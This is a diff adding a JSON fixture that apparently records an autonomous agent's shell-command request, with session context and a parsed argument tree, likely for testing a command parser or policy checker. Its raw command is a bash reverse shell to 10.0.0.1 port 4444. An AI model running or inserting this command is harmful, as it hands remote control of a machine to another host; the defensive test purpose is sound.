@@ -1,0 +1,19 @@
+{
+  "context": {
+    "agent": "shim",
+    "session_id": "shim-deadbeef",
+    "cwd": "/home/dev",
+    "autonomous": true
+  },
+  "kind": "shell",
+  "raw": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+  "cwd": "/home/dev",
+  "argv_tree": {
+    "node": "command",
+    "argv": ["bash", "-i"],
+    "redirects": [
+      { "op": "dup", "target": "/dev/tcp/10.0.0.1/4444" },
+      { "fd": 0, "op": "dup", "target": "&1" }
+    ]
+  }
+}
